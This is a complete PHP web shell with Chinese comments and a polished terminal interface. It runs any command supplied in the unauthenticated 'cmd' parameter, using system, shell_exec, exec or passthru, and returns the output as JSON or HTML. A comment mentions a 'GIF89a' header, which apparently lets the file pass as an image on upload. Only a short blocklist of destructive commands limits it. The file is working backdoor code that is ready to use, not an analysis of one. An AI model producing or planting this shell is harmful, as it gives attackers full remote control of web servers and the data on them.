<?php
// 注意：文件头 GIF89a 已经在最上面，后面不能有任何输出
// 所有PHP代码必须在这里，不能有任何输出之前的内容

// 执行命令逻辑
$response = [
    'success' => false,
    'command' => '',
    'output' => '',
    'error' => '',
    'execution_time' => 0,
    'return_code' => -1
];

// 获取当前命令
$cmd = $_GET['cmd'] ?? $_POST['cmd'] ?? '';

// 执行命令（如果有输入）
if(!empty($cmd)) {
    $response['command'] = $cmd;
    
    // 安全检查
    $dangerous = ['rm -rf', 'mkfs', 'dd if=', '>/dev/sda'];
    foreach($dangerous as $danger) {
        if(strpos($cmd, $danger) !== false) {
            $response['error'] = 'Dangerous command blocked';
            $response['success'] = false;
            goto output_json;
        }
    }
    
    // 记录开始时间
    $start_time = microtime(true);
    
    // 执行命令
    $output = '';
    $return_code = -1;
    
    if(function_exists('system')) {
        ob_start();
        system($cmd . ' 2>&1', $return_code);
        $output = ob_get_clean();
    } elseif(function_exists('shell_exec')) {
        $output = shell_exec($cmd . ' 2>&1');
        $return_code = ($output === null) ? -1 : 0;
    } elseif(function_exists('exec')) {
        exec($cmd . ' 2>&1', $output_lines, $return_code);
        $output = implode("\n", $output_lines);
    } elseif(function_exists('passthru')) {
        ob_start();
        passthru($cmd, $return_code);
        $output = ob_get_clean();
    } else {
        $response['error'] = 'No command execution function available';
    }
    
    // 计算执行时间
    $execution_time = microtime(true) - $start_time;
    
    // 判断执行结果
    $response['success'] = ($return_code === 0);
    $response['output'] = $output;
    $response['error'] = ($return_code !== 0 && !$response['error']) ? "Command failed with code: $return_code" : $response['error'];
    $response['return_code'] = $return_code;
    $response['execution_time'] = round($execution_time, 4);
    
    output_json:
    // 如果是AJAX请求，返回JSON
    if(isset($_GET['ajax']) || isset($_POST['ajax'])) {
        header('Content-Type: application/json');
        echo json_encode($response, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
        exit;
    }
}

// 如果不是AJAX请求，输出HTML页面
if(!isset($_GET['ajax']) && !isset($_POST['ajax'])) {
?>
<!DOCTYPE html>
<html>
<head>
    <title>Web Shell with Local Storage</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * {
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Consolas', 'Monaco', 'Courier New', monospace;
            margin: 0;
            padding: 20px;
            background: #1e1e1e;
            color: #d4d4d4;
        }
        
        .terminal {
            max-width: 1200px;
            margin: 0 auto;
            background: #2d2d2d;
            border-radius: 8px;
            overflow: hidden;
            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
        }
        
        .terminal-header {
            background: #1a1a1a;
            padding: 12px 20px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            border-bottom: 1px solid #3c3c3c;
        }
        
        .title {
            color: #9cdcfe;
            font-size: 14px;
            font-weight: bold;
        }
        
        .path {
            color: #6a9955;
            font-size: 13px;
            background: #2d2d2d;
            padding: 4px 10px;
            border-radius: 4px;
        }
        
        .history-controls {
            display: flex;
            gap: 10px;
            align-items: center;
        }
        
        .history-count {
            background: #3c3c3c;
            padding: 4px 10px;
            border-radius: 12px;
            font-size: 12px;
            color: #888;
        }
        
        .clear-btn {
            background: #c42b1c;
            color: white;
            border: none;
            padding: 6px 15px;
            border-radius: 4px;
            font-size: 12px;
            cursor: pointer;
        }
        
        .clear-btn:hover {
            background: #a01d12;
        }
        
        .output-area {
            padding: 20px;
            min-height: 500px;
            max-height: 600px;
            overflow-y: auto;
            background: #1e1e1e;
            display: flex;
            flex-direction: column;
            gap: 20px;
        }
        
        .command-block {
            border-left: 3px solid #007acc;
            background: #2d2d2d;
            border-radius: 0 6px 6px 0;
            animation: fadeIn 0.3s ease;
        }
        
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }
        
        .command-header {
            padding: 12px 15px;
            background: #3c3c3c;
            display: flex;
            align-items: center;
            gap: 12px;
            font-size: 14px;
            flex-wrap: wrap;
        }
        
        .timestamp {
            color: #888;
            font-size: 11px;
            min-width: 60px;
        }
        
        .prompt {
            color: #6a9955;
            font-weight: bold;
        }
        
        .command-text {
            color: #9cdcfe;
            word-break: break-all;
            flex-grow: 1;
        }
        
        .exec-time {
            color: #888;
            font-size: 11px;
        }
        
        .status-badge {
            padding: 2px 8px;
            border-radius: 4px;
            font-size: 10px;
            font-weight: bold;
        }
        
        .status-success {
            background: #6a9955;
            color: #1e1e1e;
        }
        
        .status-fail {
            background: #f48771;
            color: #1e1e1e;
        }
        
        .command-output {
            padding: 15px;
            white-space: pre-wrap;
            word-break: break-all;
            font-size: 13px;
            line-height: 1.5;
            border-bottom: 1px solid #3c3c3c;
            font-family: 'Consolas', 'Monaco', monospace;
            background: #1e1e1e;
        }
        
        .command-error {
            padding: 12px 15px;
            background: #3c1e1e;
            color: #f48771;
            font-size: 13px;
        }
        
        .command-footer {
            padding: 8px 15px;
            background: #252525;
            font-size: 11px;
            color: #888;
            display: flex;
            gap: 20px;
        }
        
        .empty-state {
            padding: 60px 20px;
            text-align: center;
            color: #666;
        }
        
        .empty-icon {
            font-size: 48px;
            margin-bottom: 20px;
            opacity: 0.5;
        }
        
        .input-section {
            padding: 20px;
            background: #2d2d2d;
            border-top: 2px solid #3c3c3c;
        }
        
        .input-form {
            display: flex;
            gap: 10px;
            align-items: center;
        }
        
        .prompt-large {
            color: #6a9955;
            font-weight: bold;
            font-size: 18px;
        }
        
        .command-input {
            flex-grow: 1;
            background: #3c3c3c;
            border: 1px solid #4c4c4c;
            color: #d4d4d4;
            font-family: 'Consolas', 'Monaco', monospace;
            font-size: 15px;
            padding: 12px 15px;
            border-radius: 6px;
            outline: none;
        }
        
        .command-input:focus {
            border-color: #007acc;
            background: #4c4c4c;
        }
        
        .submit-btn {
            background: #007acc;
            color: white;
            border: none;
            padding: 12px 30px;
            border-radius: 6px;
            font-family: inherit;
            font-size: 14px;
            font-weight: bold;
            cursor: pointer;
            transition: background 0.2s;
        }
        
        .submit-btn:hover {
            background: #005a9e;
        }
        
        .info-bar {
            margin-top: 10px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            font-size: 11px;
            color: #666;
        }
        
        .shortcuts {
            display: flex;
            gap: 20px;
        }
        
        .shortcut {
            display: flex;
            align-items: center;
            gap: 5px;
        }
        
        .key {
            background: #3c3c3c;
            padding: 2px 6px;
            border-radius: 4px;
            border: 1px solid #4c4c4c;
            font-size: 10px;
            color: #9cdcfe;
        }
        
        ::-webkit-scrollbar {
            width: 8px;
        }
        
        ::-webkit-scrollbar-track {
            background: #1e1e1e;
        }
        
        ::-webkit-scrollbar-thumb {
            background: #4c4c4c;
            border-radius: 4px;
        }
        
        ::-webkit-scrollbar-thumb:hover {
            background: #5c5c5c;
        }
        
        @media (max-width: 768px) {
            body { padding: 10px; }
            .input-form { flex-direction: column; }
            .submit-btn { width: 100%; }
            .command-header { flex-direction: column; align-items: flex-start; }
            .shortcuts { flex-wrap: wrap; }
        }
    </style>
</head>
<body>
    <div class="terminal">
        <div class="terminal-header">
            <div class="title">🔷 Web Shell with Local Storage</div>
            <div class="path"><?php echo htmlspecialchars(getcwd() ?: '/var/www/html'); ?></div>
            <div class="history-controls">
                <span class="history-count" id="history-count">0 commands</span>
                <button class="clear-btn" onclick="clearHistory()">Clear History</button>
            </div>
        </div>
        
        <div class="output-area" id="output-area">
            <div class="empty-state" id="empty-state">
                <div class="empty-icon">⚡</div>
                <div class="empty-text">No command history yet</div>
                <div class="empty-hint">Enter a command below to get started</div>
            </div>
        </div>
        
        <div class="input-section">
            <form class="input-form" id="command-form" onsubmit="return executeCommand(event)">
                <span class="prompt-large">$</span>
                <input type="text" 
                       id="cmd-input" 
                       class="command-input" 
                       placeholder="Enter command..."
                       autocomplete="off"
                       autofocus>
                <button type="submit" class="submit-btn">Execute</button>
            </form>
            
            <div class="info-bar">
                <div class="shortcuts">
                    <span class="shortcut"><span class="key">Enter</span> Execute</span>
                    <span class="shortcut"><span class="key">Ctrl+L</span> Clear screen</span>
                    <span class="shortcut"><span class="key">Esc</span> Clear input</span>
                </div>
                <div>💡 History saved in browser</div>
            </div>
        </div>
    </div>
    
    <script>
        // 本地存储键名
        const STORAGE_KEY = 'web_shell_history';
        
        // 加载历史记录
        let commandHistory = [];
        try {
            const saved = sessionStorage.getItem(STORAGE_KEY);
            if (saved) {
                commandHistory = JSON.parse(saved);
            }
        } catch (e) {
            console.error('Failed to load history:', e);
        }
        
        // 显示所有历史记录
        function displayHistory() {
            const outputArea = document.getElementById('output-area');
            // const emptyState = document.getElementById('empty-state');
            const historyCount = document.getElementById('history-count');
            
            // 更新计数
            historyCount.textContent = commandHistory.length + ' commands';
            
            // if (commandHistory.length === 0) {
            //     emptyState.style.display = 'block';
            //     outputArea.innerHTML = '';
            //     outputArea.appendChild(emptyState);
            //     return;
            // }
            
            // emptyState.style.display = 'none';
            
            // 生成HTML
            let html = '';
            commandHistory.forEach(entry => {
                const statusClass = entry.success ? 'status-success' : 'status-fail';
                const statusText = entry.success ? '✓ Success' : '✗ Failed';
                
                html += `
                    <div class="command-block">
                        <div class="command-header">
                            <span class="timestamp">[${entry.timestamp}]</span>
                            <span class="prompt">$</span>
                            <span class="command-text">${escapeHtml(entry.command)}</span>
                            <span class="exec-time">${entry.exec_time}s</span>
                            <span class="status-badge ${statusClass}">${statusText}</span>
                        </div>
                        ${entry.output ? `<div class="command-output">${escapeHtml(entry.output)}</div>` : ''}
                        ${entry.error ? `<div class="command-error">❌ ${escapeHtml(entry.error)}</div>` : ''}
                        <div class="command-footer">
                            <span>Exit code: ${entry.return_code}</span>
                            ${entry.output ? `<span>Output size: ${entry.output.length} bytes</span>` : ''}
                        </div>
                    </div>
                `;
            });
            
            outputArea.innerHTML = html;
            
            // 滚动到底部
            outputArea.scrollTop = outputArea.scrollHeight;
        }
        
        // HTML转义
        function escapeHtml(text) {
            if (!text) return '';
            const div = document.createElement('div');
            div.textContent = text;
            return div.innerHTML;
        }
        
        // 执行命令（AJAX）
        async function executeCommand(event) {
            event.preventDefault();
            
            const input = document.getElementById('cmd-input');
            const cmd = input.value.trim();
            
            if (!cmd) return false;
            
            // 清空输入框
            input.value = '';
            
            try {
                // 发送AJAX请求
                const response = await fetch(window.location.pathname + '?ajax=1&cmd=' + encodeURIComponent(cmd));
                const result = await response.json();
                
                // 添加到历史
                const entry = {
                    timestamp: new Date().toLocaleTimeString(),
                    command: cmd,
                    output: result.output || '',
                    error: result.error || '',
                    success: result.success,
                    return_code: result.return_code,
                    exec_time: result.execution_time
                };
                
                commandHistory.push(entry);
                
                // 限制历史数量（最多50条）
                if (commandHistory.length > 50) {
                    commandHistory = commandHistory.slice(-50);
                }
                
                // 保存到本地存储
                sessionStorage.setItem(STORAGE_KEY, JSON.stringify(commandHistory));
                
                // 更新显示
                displayHistory();
                
            } catch (e) {
                console.error('Failed to execute command:', e);
                alert('Failed to execute command');
            }
            
            return false;
        }
        
        // 清空历史
        function clearHistory() {
            if (confirm('Clear all command history?')) {
                commandHistory = [];
                sessionStorage.removeItem(STORAGE_KEY);
                displayHistory();
            }
        }
        
        // 键盘快捷键
        document.getElementById('cmd-input').addEventListener('keydown', function(e) {
            // Ctrl+L 清屏
            if (e.ctrlKey && e.key === 'l') {
                e.preventDefault();
                document.getElementById('output-area').scrollTop = 0;
            }
            
            // Esc 清空输入框
            if (e.key === 'Escape') {
                e.preventDefault();
                this.value = '';
            }
        });
        
        // 页面加载时显示历史
        displayHistory();
    </script>
</body>
</html>
<?php } ?>